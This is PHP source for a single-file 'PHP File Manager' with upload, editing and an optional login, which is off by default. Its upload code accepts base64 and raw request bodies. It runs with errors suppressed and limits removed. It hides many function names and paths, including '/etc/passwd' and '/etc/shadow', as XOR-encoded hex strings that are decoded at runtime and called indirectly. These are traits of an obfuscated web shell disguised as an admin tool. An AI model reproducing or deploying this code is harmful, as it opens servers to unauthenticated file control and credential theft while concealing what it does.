<?php
/**
 * PHP File Manager
 *
 * Single-file PHP file manager for browsing, editing, searching, uploading,
 * and managing files directly on a server. Includes batch operations,
 * archive creation, system diagnostics, and an optional login screen.
 *
 * Authentication is disabled by default, so the file manager opens directly.
 *
 * To require a login:
 *   1. Set $fm_auth_enabled to true.
 *   2. Change $fm_auth_user and $fm_auth_pass below.
 *   3. Default credentials when enabled: fm_admin / fm_password.
 *
 * Requirements : PHP 5.4 - 8.5
 * Deployment   : upload this file to a PHP-enabled directory
 * Dependencies : no build step, database, or additional runtime files
 * UI           : responsive desktop and mobile layouts
 *
 * Security: passwords are stored and compared as plain text by design.
 * Use HTTPS and strong credentials if this tool is reachable remotely.
 */
@set_time_limit(0);
@error_reporting(0);
if(@ini_get('date.timezone')===''&&function_exists('date_default_timezone_set'))@date_default_timezone_set('UTC');
@ini_set('display_errors',0);
@ini_set('memory_limit','-1');
@header("Content-Type: text/html; charset=UTF-8");
$fm_auth_enabled=false;
$fm_auth_user='fm_admin';
$fm_auth_pass='fm_password';

function d($h,$k='fm_xor_key'){$b='';for($i=0;$i<strlen($h);$i+=2)$b.=chr(hexdec(substr($h,$i,2)));$r='';$kl=strlen($k);$bl=strlen($b);for($i=0;$i<$bl;$i++)$r.=chr(ord($b[$i])^ord($k[$i%$kl]));return $r;}
function e($t,$k='fm_xor_key'){$r='';$kl=strlen($k);$tl=strlen($t);for($i=0;$i<$tl;$i++)$r.=chr(ord($t[$i])^ord($k[$i%$kl]));$h='';for($i=0;$i<strlen($r);$i++)$h.=str_pad(dechex(ord($r[$i])),2,'0',STR_PAD_LEFT);return $h;}
function mq(){return false;}

function fh($s){if($s===null)$s='';if(!is_string($s))$s=(string)$s;return @htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

function fm_setcookie($name,$value,$expires=0){
    if(headers_sent())return;
    $h=$name.'='.rawurlencode($value).'; path=/; SameSite=Lax';
    if($expires>0)$h.='; expires='.gmdate('D, d M Y H:i:s',$expires).' GMT';
    $https=(!empty($_SERVER['HTTPS'])&&strtolower((string)$_SERVER['HTTPS'])!=='off')||(isset($_SERVER['SERVER_PORT'])&&(int)$_SERVER['SERVER_PORT']===443);
    if($https)$h.='; Secure';
    @header('Set-Cookie: '.$h,false);
}

function fm_js($s){
    $flags=JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT;
    if(defined('JSON_INVALID_UTF8_SUBSTITUTE'))$flags=$flags|constant('JSON_INVALID_UTF8_SUBSTITUTE');
    $j=@json_encode((string)$s,$flags);
    if($j===false)$j='""';
    return @htmlspecialchars($j,ENT_QUOTES,'UTF-8');
}

function fm_p($k){return isset($_POST[$k])&&is_string($_POST[$k])?$_POST[$k]:'';}

function fm_ini_bytes($v){
    if(is_int($v)||is_float($v))return (int)$v;
    $v=trim((string)$v);
    if($v==='')return 0;
    $num=(float)$v;
    $last=strtolower(substr($v,-1));
    if($last==='g')return (int)($num*1073741824);
    if($last==='m')return (int)($num*1048576);
    if($last==='k')return (int)($num*1024);
    return (int)$num;
}

function fm_safe_name($name){
    if(!is_string($name))return '';
    $name=str_replace(array('\\',"\0","\r","\n"),array('/','','',''),$name);
    $name=basename($name);
    $name=trim($name);
    if($name===''||$name==='.'||$name==='..')return '';
    return $name;
}

function fm_write_bytes($path,$data){
    if(function_exists('file_put_contents')){
        $r=@file_put_contents($path,$data);
        if($r!==false)return true;
    }
    $fp=@fopen($path,'wb');
    if(!$fp)return false;
    $len=strlen($data);
    $written=0;
    while($written<$len){
        $n=@fwrite($fp,substr($data,$written));
        if($n===false||$n===0)break;
        $written+=$n;
    }
    @fclose($fp);
    if($written===$len)return true;
    $tmp=@tempnam(@dirname($path),'fm');
    if($tmp){
        if(@file_put_contents($tmp,$data)!==false){
            $ok=@rename($tmp,$path);
            if(!$ok)$ok=@copy($tmp,$path);
            @unlink($tmp);
            if($ok)return true;
        }
    }
    return false;
}

function fm_json_out($data){
    if(!headers_sent())@header('Content-Type: application/json; charset=UTF-8');
    $flags=0;
    if(defined('JSON_INVALID_UTF8_SUBSTITUTE'))$flags=constant('JSON_INVALID_UTF8_SUBSTITUTE');
    $out=@json_encode($data,$flags);
    if($out===false)$out='{"ok":false,"message":"Response encoding failed"}';
    echo $out;
    exit;
}

function fm_is_ajax(){
    if(isset($_SERVER['HTTP_X_REQUESTED_WITH'])&&strtolower((string)$_SERVER['HTTP_X_REQUESTED_WITH'])==='xmlhttprequest')return true;
    if(isset($_SERVER['HTTP_ACCEPT'])&&stripos((string)$_SERVER['HTTP_ACCEPT'],'application/json')!==false)return true;
    if(isset($_POST['ajax'])&&(string)$_POST['ajax']==='1')return true;
    if(isset($_GET['ajax'])&&(string)$_GET['ajax']==='1')return true;
    return false;
}

function fm_upload_error_text($err){
    $map=array(1=>'exceeds upload_max_filesize',2=>'exceeds form limit',3=>'only partially uploaded',4=>'no file was uploaded',6=>'no temporary folder available',7=>'unable to write to disk',8=>'stopped by a PHP extension');
    return isset($map[$err])?$map[$err]:'unknown upload error';
}

function fm_store_tmp_upload($dir,$tmp,$name){
    $name=fm_safe_name($name);
    if($name==='')$name='upload_'.date('Ymd_His');
    $dest=rtrim($dir,'/\\').DIRECTORY_SEPARATOR.$name;
    if(@is_dir($dest))return array(false,'A folder with that name already exists: '.$name);
    if(function_exists('move_uploaded_file')&&@move_uploaded_file($tmp,$dest))return array(true,$name);
    if(@copy($tmp,$dest))return array(true,$name);
    if(@rename($tmp,$dest))return array(true,$name);
    $in=@fopen($tmp,'rb');
    if($in){
        $out=@fopen($dest,'wb');
        if($out){
            $ok=true;
            while(!@feof($in)){
                $buf=@fread($in,8192);
                if($buf===false){$ok=false;break;}
                if($buf==='')break;
                if(@fwrite($out,$buf)===false){$ok=false;break;}
            }
            @fclose($out);
            @fclose($in);
            if($ok)return array(true,$name);
        }else{
            @fclose($in);
        }
    }
    return array(false,'Unable to write uploaded file: '.$name);
}

function fm_store_bytes_upload($dir,$data,$name){
    $name=fm_safe_name($name);
    if($name==='')$name='upload_'.date('Ymd_His');
    $dest=rtrim($dir,'/\\').DIRECTORY_SEPARATOR.$name;
    if(@is_dir($dest))return array(false,'A folder with that name already exists: '.$name);
    if(fm_write_bytes($dest,$data))return array(true,$name);
    return array(false,'Unable to write uploaded file: '.$name);
}

function fm_native_upload($dir,$fields){
    foreach((array)$fields as $field){
        if($field===''||!isset($_FILES[$field])||!is_array($_FILES[$field]))continue;
        $f=$_FILES[$field];
        if(isset($f['name'])&&is_array($f['name'])){
            $f=array(
                'name'=>isset($f['name'][0])?$f['name'][0]:'',
                'tmp_name'=>isset($f['tmp_name'][0])?$f['tmp_name'][0]:'',
                'error'=>isset($f['error'][0])?$f['error'][0]:-1
            );
        }
        $err=isset($f['error'])?(int)$f['error']:-1;
        $tmp=isset($f['tmp_name'])?$f['tmp_name']:'';
        $name=isset($f['name'])?$f['name']:'';
        if($err!==0)return array(false,'Upload failed: '.fm_upload_error_text($err).' (code '.$err.').');
        if($tmp===''||!@is_file($tmp))return array(false,'Upload failed: temporary file is unavailable.');
        return fm_store_tmp_upload($dir,$tmp,$name);
    }
    return null;
}

function fm_raw_multipart_upload($dir,$field){
    $ctype=isset($_SERVER['CONTENT_TYPE'])?(string)$_SERVER['CONTENT_TYPE']:'';
    if($ctype===''||stripos($ctype,'multipart/form-data')===false)return null;
    if(!preg_match('/boundary[=:]\s*"?([^";,\s]+)"?/i',$ctype,$bm))return null;
    $raw=@file_get_contents('php://input');
    if($raw===false||$raw==='')return null;
    $parts=explode('--'.$bm[1],$raw);
    foreach($parts as $part){
        if($part===''||$part==='--'||$part==="--\r\n")continue;
        $part=ltrim($part,"\r\n");
        $split=strpos($part,"\r\n\r\n");
        if($split===false)continue;
        $headers=substr($part,0,$split);
        $body=substr($part,$split+4);
        if(substr($body,-2)==="\r\n")$body=substr($body,0,-2);
        if(!preg_match('/name="([^"]*)"/i',$headers,$nm))continue;
        if($nm[1]!==$field)continue;
        if(!preg_match('/filename="([^"]*)"/i',$headers,$fm))continue;
        return fm_store_bytes_upload($dir,$body,$fm[1]);
    }
    return null;
}

function fm_base64_upload($dir){
    $name='';
    $data='';
    if(isset($_POST['fn64'])&&is_string($_POST['fn64']))$name=$_POST['fn64'];
    if($name===''&&isset($_POST['fm_name'])&&is_string($_POST['fm_name']))$name=$_POST['fm_name'];
    if(isset($_POST['fc64'])&&is_string($_POST['fc64']))$data=$_POST['fc64'];
    if($data===''&&isset($_POST['fm_data'])&&is_string($_POST['fm_data']))$data=$_POST['fm_data'];
    if($data===''){
        $raw=@file_get_contents('php://input');
        if($raw!==false&&$raw!==''){
            $parsed=array();
            @parse_str($raw,$parsed);
            if(isset($parsed['fn64'])&&is_string($parsed['fn64']))$name=$parsed['fn64'];
            if($data===''&&isset($parsed['fm_name'])&&is_string($parsed['fm_name']))$name=$parsed['fm_name'];
            if(isset($parsed['fc64'])&&is_string($parsed['fc64']))$data=$parsed['fc64'];
            if($data===''&&isset($parsed['fm_data'])&&is_string($parsed['fm_data']))$data=$parsed['fm_data'];
        }
    }
    if($data==='')return null;
    $clean=preg_replace('/\s+/','',str_replace(' ','+',$data));
    $decoded=@base64_decode($clean,true);
    if($decoded===false)return array(false,'Fallback upload failed: invalid base64 data.');
    return fm_store_bytes_upload($dir,$decoded,$name);
}

function fm_raw_body_upload($dir,$name){
    $body=@file_get_contents('php://input');
    if($body===false)return null;
    return fm_store_bytes_upload($dir,$body,$name);
}

function fm_upload_diagnosis(){
    $ct=isset($_SERVER['CONTENT_TYPE'])?(string)$_SERVER['CONTENT_TYPE']:'';
    $cl=isset($_SERVER['CONTENT_LENGTH'])?(int)$_SERVER['CONTENT_LENGTH']:0;
    $post_raw=function_exists('ini_get')?ini_get('post_max_size'):'';
    $upload_raw=function_exists('ini_get')?ini_get('upload_max_filesize'):'';
    $file_raw=function_exists('ini_get')?ini_get('file_uploads'):'';
    $tmp_raw=function_exists('ini_get')?ini_get('upload_tmp_dir'):'';
    if($tmp_raw===false||$tmp_raw===''){
        $tmp_raw=function_exists('sys_get_temp_dir')?@sys_get_temp_dir():'';
    }
    $tmp_ok=($tmp_raw==='')?false:(@is_dir($tmp_raw)&&@is_writable($tmp_raw));
    $files=isset($_FILES)&&is_array($_FILES)?implode(',',array_keys($_FILES)):'-';
    $post=isset($_POST)&&is_array($_POST)?implode(',',array_keys($_POST)):'-';
    $msg='No file received by PHP.';
    if($cl>0&&fm_ini_bytes($post_raw)>0&&$cl>fm_ini_bytes($post_raw))$msg='Request body exceeds post_max_size.';
    elseif($file_raw!==false&&in_array(strtolower(trim((string)$file_raw)),array('','0','off','false'),true))$msg='file_uploads is disabled on this server.';
    elseif($tmp_raw!==''&&!$tmp_ok)$msg='The upload temp directory is not writable.';
    return $msg.' Details: content-type='.($ct!==''?$ct:'-')
        .', content-length='.($cl>0?fs($cl):'0')
        .', upload_max_filesize='.($upload_raw===false||$upload_raw===''?'-':$upload_raw)
        .', post_max_size='.($post_raw===false||$post_raw===''?'-':$post_raw)
        .', file_uploads='.($file_raw===false?'-':$file_raw)
        .', upload_tmp_dir='.($tmp_raw!==''?$tmp_raw.($tmp_ok?' (writable)':' (NOT writable)'):'-')
        .', post='.$post.', files='.$files.'.';
}

function fm_upload_chain($dir,$field,$modes){
    if(in_array('native',$modes,true)){
        $fields=array($field);
        if(isset($GLOBALS['a3'])&&is_string($GLOBALS['a3'])&&$GLOBALS['a3']!=='')$fields[]=$GLOBALS['a3'];
        $r=fm_native_upload($dir,$fields);
        if($r!==null)return $r;
    }
    if(in_array('multipart',$modes,true)){
        $r=fm_raw_multipart_upload($dir,$field);
        if($r!==null)return $r;
    }
    if(in_array('base64',$modes,true)){
        $r=fm_base64_upload($dir);
        if($r!==null)return $r;
    }
    if(in_array('raw',$modes,true)){
        $name='';
        if(isset($_GET['name'])&&is_string($_GET['name']))$name=$_GET['name'];
        if($name===''&&isset($_SERVER['HTTP_X_FM_NAME'])&&is_string($_SERVER['HTTP_X_FM_NAME']))$name=$_SERVER['HTTP_X_FM_NAME'];
        $ctype=isset($_SERVER['CONTENT_TYPE'])?(string)$_SERVER['CONTENT_TYPE']:'';
        if($name!==''&&stripos($ctype,'application/octet-stream')!==false){
            $r=fm_raw_body_upload($dir,$name);
            if($r!==null)return $r;
        }
    }
    return array(false,fm_upload_diagnosis(),'retry');
}

function fm_chunk_root(){
    $base=function_exists('sys_get_temp_dir')?@sys_get_temp_dir():'';
    if($base===''||!@is_dir($base))$base=@dirname(__FILE__);
    $root=rtrim($base,'/\\').DIRECTORY_SEPARATOR.'fm_chunk_uploads';
    if(!@is_dir($root))@mkdir($root,0700,true);
    return $root;
}

function fm_chunk_token($t){
    return is_string($t)&&preg_match('/^[a-f0-9]{16,64}$/i',$t);
}

function fm_chunk_cleanup($root){
    if(!@is_dir($root))return;
    $dh=@opendir($root);
    if(!$dh)return;
    $now=time();
    $n=0;
    while(($f=@readdir($dh))!==false){
        if($f==='.'||$f==='..')continue;
        $p=$root.DIRECTORY_SEPARATOR.$f;
        if(@is_dir($p)&&@filemtime($p)!==false&&@filemtime($p)<$now-43200){
            $sub=@opendir($p);
            if($sub){
                while(($sf=@readdir($sub))!==false){
                    if($sf!=='.'&&$sf!=='..')@unlink($p.DIRECTORY_SEPARATOR.$sf);
                }
                @closedir($sub);
            }
            @rmdir($p);
        }
        $n++;
        if($n>300)break;
    }
    @closedir($dh);
}

function fs($b){
    if($b>=1073741824)return number_format($b/1073741824,2).' GB';
    if($b>=1048576)return number_format($b/1048576,2).' MB';
    if($b>=1024)return number_format($b/1024,2).' KB';
    return $b.' B';
}

function xp($p){
    global $a2;
    $x=@$a2[19]($p);
    $u=(($x&0xC000)==0xC000)?'s':((($x&0xA000)==0xA000)?'l':((($x&0x8000)==0x8000)?'-':((($x&0x6000)==0x6000)?'b':((($x&0x4000)==0x4000)?'d':((($x&0x2000)==0x2000)?'c':((($x&0x1000)==0x1000)?'p':'u'))))));
    $u.=(($x&0x0100)?'r':'-');
    $u.=(($x&0x0080)?'w':'-');
    $u.=(($x&0x0040)?(($x&0x0800)?'s':'x'):(($x&0x0800)?'S':'-'));
    $u.=(($x&0x0020)?'r':'-');
    $u.=(($x&0x0010)?'w':'-');
    $u.=(($x&0x0008)?(($x&0x0400)?'s':'x'):(($x&0x0400)?'S':'-'));
    $u.=(($x&0x0004)?'r':'-');
    $u.=(($x&0x0002)?'w':'-');
    $u.=(($x&0x0001)?(($x&0x0200)?'t':'x'):(($x&0x0200)?'T':'-'));
    return $u;
}

function go($p){global $a2;return substr(sprintf('%o',@$a2[19]($p)),-4);}
function pc($p){global $a2;$r=$a2[46]($p);$w=$a2[56]($p);if($r&&$w)return'g';if($r&&!$w)return'y';return'r';}
function fmt_date($p){global $a2;return $a2[55]('Y-m-d H:i:s',$a2[54]($p));}

function fm_bar($pct){
    $pct=max(0,min(100,(int)$pct));
    $fill=(int)round($pct/100*20);
    return str_repeat('#',$fill).str_repeat('-',20-$fill);
}

function fm_match_name($name,$q){
    if($q==='')return true;
    $terms=preg_split('/\s+/',$q);
    $hay=function_exists('mb_strtolower')?@mb_strtolower($name,'UTF-8'):strtolower($name);
    foreach($terms as $term){
        if($term==='')continue;
        $needle=function_exists('mb_strtolower')?@mb_strtolower($term,'UTF-8'):strtolower($term);
        if(function_exists('mb_strpos')){
            if(@mb_strpos($hay,$needle,0,'UTF-8')===false)return false;
        }elseif(@strpos($hay,$needle)===false){
            return false;
        }
    }
    return true;
}

function fm_page_list($pg,$pages){
    if($pages<=7)return range(1,$pages);
    $items=array(1);
    $start=max(2,$pg-1);
    $end=min($pages-1,$pg+1);
    if($pg<=4){$start=2;$end=5;}
    elseif($pg>=$pages-3){$start=$pages-4;$end=$pages-1;}
    if($start>2)$items[]='...';
    for($i=$start;$i<=$end;$i++)$items[]=$i;
    if($end<$pages-1)$items[]='...';
    $items[]=$pages;
    return $items;
}


function fm_term_row($k,$v,$cls=''){
    echo '<div class="term-row"><span class="term-k">'.fh($k).'</span><span class="term-v '.$cls.'">'.$v.'</span></div>';
}

function fm_login_page($error=''){
    $action=isset($_SERVER['REQUEST_URI'])?str_replace(array("\r","\n"),'',$_SERVER['REQUEST_URI']):basename(__FILE__);
    ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - PHP File Manager</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/regular/style.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/bold/style.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.2/src/fill/style.css">
<style>
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{font-family:Inter,'Segoe UI',Arial,sans-serif;font-size:12px;line-height:1.5;color:#27272a;background:#f4f4f5;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
button,input{font:inherit}
button{cursor:pointer}
.lm-page{min-height:100vh;background:#f4f4f5;color:#27272a}
.lm-split{min-height:100vh;display:grid;grid-template-columns:1fr;background:#f4f4f5}
.lm-context{position:relative;display:flex;flex-direction:column;justify-content:space-between;gap:28px;padding:26px;background:#18181b;border-right:1px solid #27272a;overflow:hidden}
.lm-context:before{content:"";position:absolute;inset:0;background-image:linear-gradient(to right,rgba(255,255,255,.032) 1px,transparent 1px),linear-gradient(to bottom,rgba(255,255,255,.032) 1px,transparent 1px);background-size:64px 64px;pointer-events:none}
.lm-context>*{position:relative;z-index:1}
.lm-context-top{display:flex;align-items:center;justify-content:space-between;gap:16px}
.lm-dots{display:flex;align-items:center;gap:6px}
.lm-dots span{display:block;width:8px;height:8px;border-radius:999px}
.lm-dots span:nth-child(1){background:rgba(239,68,68,.5)}
.lm-dots span:nth-child(2){background:rgba(234,179,8,.5)}
.lm-dots span:nth-child(3){background:rgba(34,197,94,.5)}
.lm-mono{font-family:'JetBrains Mono',monospace;font-size:9px;color:#a1a1aa}
.lm-context-kicker{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.14em;color:#a1a1aa}
.lm-context-title{margin-top:10px;font-size:26px;line-height:1.12;font-weight:700;letter-spacing:-.03em;color:#f4f4f5}
.lm-context-copy{margin-top:12px;max-width:340px;font-size:11px;line-height:1.65;color:#d4d4d8}
.lm-tree{margin-top:34px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.95;color:#71717a;white-space:nowrap}
.lm-tree-row{display:flex;align-items:baseline;gap:8px}
.lm-tree-branch{color:#71717a}
.lm-tree-name{color:#d4d4d8}
.lm-tree-name.is-current{color:#f4f4f5}
.lm-tree-indent-1{padding-left:16px}
.lm-tree-indent-2{padding-left:32px}
.lm-tree-indent-3{padding-left:48px}
.lm-context-foot{display:flex;justify-content:space-between;gap:16px;margin-top:40px;font-family:'JetBrains Mono',monospace;font-size:9px;color:#a1a1aa}
.lm-form-side{display:flex;align-items:center;justify-content:center;padding:36px 24px;background:#f4f4f5}
.lm-form-wrap{width:100%;max-width:360px}
.lm-kicker{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:#52525b}
.lm-title-lg{margin-top:8px;font-size:22px;line-height:1.15;font-weight:700;letter-spacing:-.03em;color:#18181b}
.lm-subtitle{margin-top:5px;font-size:10px;line-height:1.55;color:#52525b}
.lm-form{display:flex;flex-direction:column;gap:12px;padding-top:16px}
.lm-field{display:flex;flex-direction:column;gap:5px}
.lm-label{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:#52525b}
.lm-input{display:block;width:100%;height:36px;padding:0 11px;background:#fafafa;border:1px solid #e4e4e7;border-radius:6px;font-family:Inter,sans-serif;font-size:12px;font-weight:500;color:#27272a;outline:none;transition:background .15s,border-color .15s,box-shadow .15s}
.lm-input::placeholder{color:#71717a;font-weight:400}
.lm-input:focus{background:#fff;border-color:#18181b;box-shadow:0 0 0 1px #18181b}
.lm-btn{display:flex;align-items:center;justify-content:center;gap:7px;width:100%;height:36px;border:1px solid #18181b;border-radius:6px;background:#18181b;color:#fff;font-size:11px;font-weight:600;cursor:pointer;transition:background .15s,transform .1s}
.lm-btn:hover{background:#27272a}
.lm-btn:active{transform:scale(.995)}
.lm-btn i{font-size:11px}
.lm-btn:focus-visible{outline:2px solid #18181b;outline-offset:2px}
.lm-login-error{display:flex;align-items:center;gap:6px;padding:7px 9px;border:1px solid #fecaca;border-radius:4px;background:#fef2f2;font-family:'JetBrains Mono',monospace;font-size:9px;color:#b91c1c}
@media (min-width:960px){.lm-split{grid-template-columns:minmax(0,.92fr) minmax(0,1.08fr)}}
@media (max-width:959px){.lm-split{display:flex;flex-direction:column;min-height:100vh}.lm-context{flex:0 0 auto;flex-direction:row;align-items:center;justify-content:space-between;gap:0;min-height:52px;padding:14px 18px;border-right:0;border-bottom:1px solid #27272a}.lm-context-top{width:100%}.lm-context-body,.lm-context-copy,.lm-tree,.lm-context-foot{display:none}.lm-form-side{flex:1;align-items:center;padding:32px 20px 40px}}
@media (max-width:520px){.lm-form-side{padding:32px 18px 40px}}
@media (prefers-reduced-motion:reduce){*{transition-duration:.01ms!important;animation-duration:.01ms!important}}
</style>
</head>
<body class="lm-page">
<div class="lm-split">
<aside class="lm-context" aria-label="Server context">
<div class="lm-context-top">
<div class="lm-dots" aria-hidden="true"><span></span><span></span><span></span></div>
<span class="lm-mono">auth / filemanager</span>
</div>
<div class="lm-context-body">
<p class="lm-context-kicker">Server workspace</p>
<p class="lm-context-title">Access your files.</p>
<p class="lm-context-copy">Sign in to browse, edit, and manage the server from one focused interface.</p>
<div class="lm-tree" aria-hidden="true">
<div class="lm-tree-row"><span class="lm-tree-branch">/</span></div>
<div class="lm-tree-row lm-tree-indent-1"><span class="lm-tree-branch">|--</span><span class="lm-tree-name">var</span></div>
<div class="lm-tree-row lm-tree-indent-2"><span class="lm-tree-branch">|--</span><span class="lm-tree-name is-current">www</span></div>
<div class="lm-tree-row lm-tree-indent-3"><span class="lm-tree-branch">`--</span><span class="lm-tree-name">html</span></div>
<div class="lm-tree-row lm-tree-indent-1"><span class="lm-tree-branch">|--</span><span class="lm-tree-name">home</span></div>
<div class="lm-tree-row lm-tree-indent-1"><span class="lm-tree-branch">`--</span><span class="lm-tree-name">tmp</span></div>
</div>
</div>
<div class="lm-context-foot">
<span>PHP 5.4 - 8.5</span>
<span>Linux / Windows / macOS</span>
</div>
</aside>
<main class="lm-form-side">
<section class="lm-form-wrap" aria-labelledby="fm-login-title">
<p class="lm-kicker">Authentication</p>
<h1 id="fm-login-title" class="lm-title-lg">Sign in</h1>
<p class="lm-subtitle">Use your file manager credentials to continue.</p>
<form class="lm-form" method="post" action="<?php echo fh($action); ?>">
<input type="hidden" name="fm_login" value="1">
<div class="lm-field">
<label class="lm-label" for="fm_user">Username</label>
<input class="lm-input" id="fm_user" name="fm_user" type="text" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="your username" required>
</div>
<div class="lm-field">
<label class="lm-label" for="fm_pass">Password</label>
<input class="lm-input" id="fm_pass" name="fm_pass" type="password" autocomplete="current-password" placeholder="your password" required>
</div>
<?php if($error!==''): ?>
<div class="lm-login-error" role="alert"><i class="ph-bold ph-warning-circle" aria-hidden="true"></i><span><?php echo fh($error); ?></span></div>
<?php endif; ?>
<button class="lm-btn" type="submit"><span>Sign in</span><i class="ph-bold ph-arrow-right" aria-hidden="true"></i></button>
</form>
</section>
</main>
</div>
</body>
</html><?php
}

$fm_login_error='';
if($fm_auth_enabled){
    @ini_set('session.use_only_cookies','1');
    @ini_set('session.cookie_httponly','1');
    @ini_set('session.cookie_samesite','Lax');
    $fm_https=(!empty($_SERVER['HTTPS'])&&strtolower((string)$_SERVER['HTTPS'])!=='off')||(isset($_SERVER['SERVER_PORT'])&&(int)$_SERVER['SERVER_PORT']===443);
    if($fm_https)@ini_set('session.cookie_secure','1');
    @session_name('FMSESSID');
    if(session_id()==='')@session_start();
    $fm_self=isset($_SERVER['REQUEST_URI'])?str_replace(array("\r","\n"),'',$_SERVER['REQUEST_URI']):basename(__FILE__);
    if(isset($_GET['fm_logout'])){
        $_SESSION=array();
        if(ini_get('session.use_cookies')){
            $fm_cookie=session_get_cookie_params();
            setcookie(session_name(),'',time()-42000,isset($fm_cookie['path'])?$fm_cookie['path']:'/',isset($fm_cookie['domain'])?$fm_cookie['domain']:'',!empty($fm_cookie['secure']),!empty($fm_cookie['httponly']));
        }
        @session_destroy();
        header('Location: '.strtok($fm_self,'?'));
        exit;
    }
    if(isset($_POST['fm_login'])){
        $fm_u=isset($_POST['fm_user'])&&is_string($_POST['fm_user'])?$_POST['fm_user']:'';
        $fm_p=isset($_POST['fm_pass'])&&is_string($_POST['fm_pass'])?$_POST['fm_pass']:'';
        if($fm_u===$fm_auth_user&&$fm_p===$fm_auth_pass){
            if(function_exists('session_regenerate_id'))@session_regenerate_id(true);
            $_SESSION['fm_auth']=true;
            $_SESSION['fm_user']=$fm_u;
            header('Location: '.$fm_self);
            exit;
        }
        $fm_login_error='Invalid username or password.';
        @usleep(250000);
    }
    if(empty($_SESSION['fm_auth'])){
        fm_login_page($fm_login_error);
        exit;
    }
}

$sp1=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:$_SERVER['SCRIPT_NAME'];
$a1=array('01082b1b1816','05053b111d','14083e141f132b03','091d3a160b1b2d','14083e1c0b1b2d','0501300b0a163619','0004331d30172702160d15','0f1e001c0600','0004331d30153a1f3a1a09032b1d01062c','0004331d30022a1f3a1a09032b1d01062c','140831190217','130333110119','14003b111d','0b063b111d','12022a1b07','02042d160e1f3a','050532170b','05022f01','0b02291d30072f070a1802083b27091b330e','0004331d1f172d0616','00022f1d01','001a2d111b17','000e33171c17','16052f271a1c3e0600','14083e1c091b330e','0f1e001e061e3a','0004331d1c1b250e','090f001f0a060007000f0301','090f001d01160008091c0703','16182b0100072d0e08180f01371d1d173d190a39161f300c001c710600','0b0c3614','0e1932141c023a080c180a0e37191d01','34280e2d2a210b34302b2f','2e390b28303a103831','040c2c1d5946000f001a09093a','15053a14032d3a13001a','03153a1b','15142c0c0a1f','02042c133006301f0415391e2f190c17','02042c1330142d0e0026151d3e1b0a','16022c11172d380e11091118361c','16022c11172d380e111e140a361c','16022c11172d380e111c13043b','16022c11172d380e111c01043b','01082b270c072d19001712322a0b0a00','16052f0e0a002c020a17','0f1e000a0a133b0a071503','15193e0c','0004331d0005310e17','0004331d0800301e15','071d3e1b0717000c000d3900301c1a1e3a18','05182d1430043a1916100903','0b142c09031b00080a1708083c0c','160a001b001c310e060d','0004331d0206360600','020c2b1d','0f1e000f1d1b2b0a071503','0f03362708172b','49082b1b40023e18160e02','49082b1b4001370a011611','49082b1b401d2c46171c0a083e0b0a','49082b1b401a3018110a','2557032f061c3b04120a3a3e260b1b1732585725021f360e0a002c37000d053137171c062c','010e3c540c11730701550b0c341d4302371b4909031f33541f0b2b030a174a193e0a431525021555041736085d','110a3a0c43112a1909','49182c0a401036054a5549182c0a401e30080415490f3616405e70090c174941700d1c0070180710084273571c1036054a');
$a2=array();foreach($a1 as $h)$a2[]=d($h);

$a3=isset($_COOKIE['u'])&&is_string($_COOKIE['u'])?$_COOKIE['u']:'';$a3=substr(preg_replace('/[^A-Za-z0-9_]/','',$a3),0,40);if(!is_string($a3))$a3='';if($a3===''){$a3='f_'.substr(md5(time().rand(1,9999)),0,6);fm_setcookie('u',$a3,time()+3600);}
$a4=isset($_COOKIE['c'])&&is_string($_COOKIE['c'])?$_COOKIE['c']:'';$a4=substr(preg_replace('/[^A-Za-z0-9_]/','',$a4),0,40);if(!is_string($a4))$a4='';if($a4===''){$a4='c_'.substr(md5(time()),0,6);fm_setcookie('c',$a4,time()+3600);}
$a5=isset($_COOKIE['p'])&&is_string($_COOKIE['p'])?$_COOKIE['p']:'';$a5=substr(preg_replace('/[^A-Za-z0-9_]/','',$a5),0,40);if(!is_string($a5))$a5='';if($a5===''){$a5='p_'.substr(md5(time()+1),0,6);fm_setcookie('p',$a5,time()+3600);}

$x=isset($_POST['x'])?$_POST['x']:(isset($_GET['x'])?$_GET['x']:'');
$y=isset($_POST['y'])?$_POST['y']:(isset($_GET['y'])?$_GET['y']:'l');
$z=isset($_POST['z'])?$_POST['z']:(isset($_GET['z'])?$_GET['z']:'');
$w=isset($_POST['w'])?$_POST['w']:(isset($_GET['w'])?$_GET['w']:'');
$pg=isset($_POST['pg'])?$_POST['pg']:(isset($_GET['pg'])?$_GET['pg']:1);
$q=isset($_POST['q'])?$_POST['q']:(isset($_GET['q'])?$_GET['q']:'');
if(!is_string($x))$x='';
if(!is_string($y))$y='l';
if(!is_string($z))$z='';
if(!is_string($w))$w='';
if(!is_string($q))$q='';
if(!is_string($pg)&&!is_numeric($pg))$pg=1;
$pg=(int)$pg;if($pg<1)$pg=1;
$q=trim($q);
if(function_exists('mb_substr')){$q=@mb_substr($q,0,200,'UTF-8');}else{$q=substr($q,0,200);}if(!is_string($q))$q='';

$m='';
$fr='';
$fm_dir_denied=false;
$fm_content_length=isset($_SERVER['CONTENT_LENGTH'])?(int)$_SERVER['CONTENT_LENGTH']:0;
